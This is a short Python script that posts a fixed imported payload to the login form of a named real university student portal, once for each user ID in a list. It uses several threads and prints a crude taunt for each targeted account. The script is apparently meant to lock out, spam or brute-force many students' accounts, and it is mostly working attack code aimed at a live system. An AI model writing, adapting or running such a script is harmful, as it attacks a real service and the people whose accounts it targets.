import requests
import sys
from time import sleep
import threading
from bs4 import BeautifulSoup
from constants import USERS, BLACKLIST, PAYLOAD


url = "http://slcm.manipal.edu"
form = "{}/loginForm.aspx".format(url)

def xprint(mess):
    sys.stdout.write("%s\n" %mess)
 

def mail(i, j, user_list) :
        payload = PAYLOAD
        for x in range(i, j):
            payload["txtUserid"]=user_list[x]
            response = requests.post(form, data=payload)
            xprint("Fucked {} ( ͡° ͜ʖ ͡°)".format(user_list[x]))
            sleep(0.5)

if __name__ == '__main__':
    n = 0
    user_list = [i for i in USERS if i not in BLACKLIST]
    threads = []

    for i in range(5):
        t1 = threading.Thread(target=mail, args=(n,n+5, user_list))
        n += 5
        threads.append(t1)

    for t in threads:
        t.start()
    for t in threads:
        t.join()
        
    xprint("**ALL COMPLETE**\n")


